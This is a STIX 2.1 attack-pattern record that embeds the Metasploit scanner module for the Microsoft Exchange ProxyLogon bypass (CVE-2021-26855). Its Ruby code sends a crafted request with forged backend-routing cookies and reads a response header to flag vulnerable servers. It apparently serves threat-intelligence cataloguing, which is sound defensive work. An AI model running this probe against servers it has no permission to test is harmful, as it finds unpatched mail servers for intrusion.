{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2ac46240-6d53-4925-a535-4b43893e50c8",
    "created": "2024-08-14T16:31:12.136503Z",
    "modified": "2024-08-14T16:31:12.136507Z",
    "name": "Microsoft Exchange ProxyLogon Scanner",
    "description": " This module scan for a vulnerability on Microsoft Exchange Server that allows an attacker bypassing the authentication and impersonating as the",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/exchange_proxylogon.rb",
            "external_id": "exchange_proxylogon.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-26855"
        },
        {
            "source_name": "reference",
            "url": "https://proxylogon.com/"
        },
        {
            "source_name": "reference",
            "url": "https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# begin auxiliary class\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Exchange ProxyLogon Scanner',\n        'Description' => %q{\n          This module scan for a vulnerability on Microsoft Exchange Server that\n          allows an attacker bypassing the authentication and impersonating as the\n          admin (CVE-2021-26855).\n\n          By chaining this bug with another post-auth arbitrary-file-write\n          vulnerability to get code execution (CVE-2021-27065).\n\n          As a result, an unauthenticated attacker can execute arbitrary commands on\n          Microsoft Exchange Server.\n\n          This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,\n          Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,\n          Exchange 2019 CU7 < 15.02.0721.013, Exchange 2019 CU8 < 15.02.0792.010).\n\n          All components are vulnerable by default.\n        },\n        'Author' => [\n          'Orange Tsai', # Dicovery (Officially acknowledged by MSRC)\n          'mekhalleh (RAMELLA S\u00e9bastien)' # Module author (Zeop Entreprise)\n        ],\n        'References' => [\n          ['CVE', '2021-26855'],\n          ['LOGO', 'https://proxylogon.com/images/logo.jpg'],\n          ['URL', 'https://proxylogon.com/'],\n          ['URL', 'https://msrc-blog.microsoft.com/2021/03/02/multiple-security-updates-released-for-exchange-server/']\n        ],\n        'DisclosureDate' => '2021-03-02',\n        'License' => MSF_LICENSE,\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'Notes' => {\n          'AKA' => ['ProxyLogon'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptEnum.new('METHOD', [true, 'HTTP Method to use for the check.', 'POST', ['GET', 'POST']])\n    ])\n  end\n\n  def message(msg)\n    \"#{@proto}://#{datastore['RHOST']}:#{datastore['RPORT']} - #{msg}\"\n  end\n\n  def run_host(target_host)\n    @proto = (ssl ? 'https' : 'http')\n\n    uri = normalize_uri('ecp', \"#{Rex::Text.rand_text_alpha(1..3)}.js\")\n    received = send_request_cgi({\n      'method' => datastore['METHOD'],\n      'uri' => uri,\n      'cookie' => 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'\n    })\n    unless received\n      print_error(message('No response, target seems down.'))\n\n      return Exploit::CheckCode::Unknown\n    end\n\n    if received && (received.code != 500 && received.code != 503)\n      print_error(message('The target is not vulnerable to CVE-2021-26855.'))\n      vprint_error(\"Obtained HTTP response code #{received.code} for #{full_uri(uri)}.\")\n\n      return Exploit::CheckCode::Safe\n    end\n\n    if received.headers['X-CalculatedBETarget'] != 'localhost'\n      print_error(message('The target is not vulnerable to CVE-2021-26855.'))\n      vprint_error('Could\\'t obtain a correct \\'X-CalculatedBETarget\\' in the response header.')\n\n      return Exploit::CheckCode::Safe\n    end\n\n    print_good(message('The target is vulnerable to CVE-2021-26855.'))\n    msg = \"Obtained HTTP response code #{received.code} for #{full_uri(uri)}.\"\n    vprint_good(msg)\n\n    report_vuln(\n      host: target_host,\n      name: name,\n      refs: references,\n      info: msg\n    )\n\n    Exploit::CheckCode::Vulnerable\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-03-02"
}